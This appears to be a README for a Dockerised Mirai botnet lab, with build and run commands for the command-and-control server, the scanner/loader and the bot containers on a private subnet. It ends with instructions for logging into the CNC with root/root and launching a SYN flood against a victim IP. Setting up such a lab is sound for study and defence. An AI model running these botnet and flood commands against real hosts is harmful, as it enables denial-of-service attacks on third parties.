# mirai-docker

## Network
Create: `docker network create --subnet=172.20.0.0/16 botnet`

## CNC
Build: `$ sudo docker build -t cnc .`  
Run: `$ sudo docker run --net botnet --ip 172.20.0.2 -i -t cnc`  

## Scanner/ Loader
Build: `$ sudo docker build -t loader .`  
Run: `$ sudo docker run --net botnet --ip 172.20.0.4 -i -t loader`  
Start Bot: `$ ./init.sh`

## Carrier Bot (Bot 1)
Build: `$ sudo docker build -t bot .`  
Run: `$ sudo docker run --net botnet -i -t bot`  
Start Bot: `$ ./init.sh [0 or 1 for scanner]` 

## Victim Bots (Bot 2)
Build: `$ sudo docker build -t bot2 .`  
Run: `$ sudo docker run --net botnet -i -t bot2`  
Start Bot: `$ ./init.sh`

## Attack Instructions
Connect to CNC: `$ telnet "IP of CNC"`  
username: root  
password: root  
attack: `$ syn "IP of Victim" "duration of attack"`  
